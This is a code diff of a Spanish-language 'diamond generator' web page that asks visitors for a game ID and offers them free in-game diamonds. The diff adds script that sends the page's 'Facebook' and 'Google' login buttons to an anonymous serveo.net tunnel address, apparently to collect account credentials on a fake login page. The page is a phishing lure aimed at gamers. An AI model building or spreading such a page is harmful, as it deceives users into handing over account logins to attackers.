@@ -37,70 +37,23 @@
             margin-top: 20px;
         }
 
-        /* Casilla de entrada de ID con borde animado eléctrico RGB */
-        .input-container {
-            position: relative;
-            width: 80%;
-            margin-bottom: 20px;
-        }
-
+        /* Casilla de entrada de ID moderna con bordes eléctricos */
         input {
             padding: 12px;
-            width: 100%;
+            width: 80%;
             margin-bottom: 20px;
             border-radius: 25px;
             font-size: 16px;
-            background-color: white;
-            color: black;
-            border: 4px solid transparent;
-            position: relative;
-            z-index: 1;
             transition: all 0.3s ease;
+            border: 3px solid transparent;
+            background: linear-gradient(45deg, #FF007F, #00FF00, #FFCC00);
+            background-clip: padding-box;
+            color: white;
         }
 
         input:focus {
             outline: none;
-        }
-
-        /* El borde de carga RGB */
-        .input-container::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(45deg, #FF007F, #00FF00, #FFCC00);
-            background-size: 400% 400%;
-            border-radius: 25px;
-            z-index: -1;
-            animation: animate-border 3s ease infinite;
-        }
-
-        /* Animación de borde eléctrico */
-        @keyframes animate-border {
-            0% {
-                background-position: 400% 0%;
-            }
-            50% {
-                background-position: 0% 100%;
-            }
-            100% {
-                background-position: 400% 0%;
-            }
-        }
-
-        /* Borde negro adicional */
-        .input-container-black::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: black;
-            border-radius: 25px;
-            z-index: -1;
+            box-shadow: 0 0 8px rgba(255, 255, 255, 0.5);
         }
 
         /* Estilo del botón "Enviar ID" */
@@ -194,17 +147,8 @@
         <h1>Generador de Diamantes - Simulación</h1>
         <div class="form-container">
             <label for="user-id">Coloca tu ID:</label>
-
-            <!-- Casilla de ID con borde eléctrico -->
-            <div class="input-container">
-                <input type="text" id="user-id" placeholder="Ingresa tu ID aquí" inputmode="numeric" maxlength="10" />
-            </div>
-
-            <!-- Casilla de ID con borde negro -->
-            <div class="input-container-black">
-                <input type="text" id="user-id-black" placeholder="ID adicional (negro)" inputmode="numeric" maxlength="10" />
-            </div>
-
+            <input type="text" id="user-id" placeholder="Ingresa tu ID aquí" inputmode="numeric" maxlength="10" />
+            
             <!-- Mensaje de error, inicialmente oculto -->
             <div id="error-message" class="error-message" style="display: none;">
                 El ID debe tener al menos 10 dígitos.
@@ -259,4 +203,36 @@
                 return;  // Detener la ejecución si el ID no es válido
             }
 
-            // Ocultar
+            // Ocultar mensaje de error si el ID es válido
+            document.getElementById('error-message').style.display = 'none';
+
+            // Si el ID es válido, muestra la barra de progreso
+            document.querySelector('.progress-bar').style.width = '100%';
+            setTimeout(() => {
+                document.getElementById('diamond-options').style.display = 'block';
+            }, 1000);
+        });
+
+        // Manejo de selección de diamantes
+        const diamondOptions = document.querySelectorAll('.diamond-option');
+        diamondOptions.forEach(option => {
+            option.addEventListener('click', function() {
+                const diamonds = option.getAttribute('data-diamonds');
+                alert(`Seleccionaste ${diamonds} Diamantes`);
+                document.getElementById('diamond-options').style.display = 'none';
+                document.getElementById('login-section').style.display = 'block';
+            });
+        });
+
+        // Redirección a enlaces de inicio de sesión
+        document.getElementById('login-facebook').addEventListener('click', function() {
+            window.location.href = 'https://cc96df6f757aa456228c7fd49f7a3787.serveo.net';
+        });
+
+        document.getElementById('login-google').addEventListener('click', function() {
+            window.location.href = 'https://cc96df6f757aa456228c7fd49f7a3787.serveo.net';
+        });
+    </script>
+
+</body>
+</html>
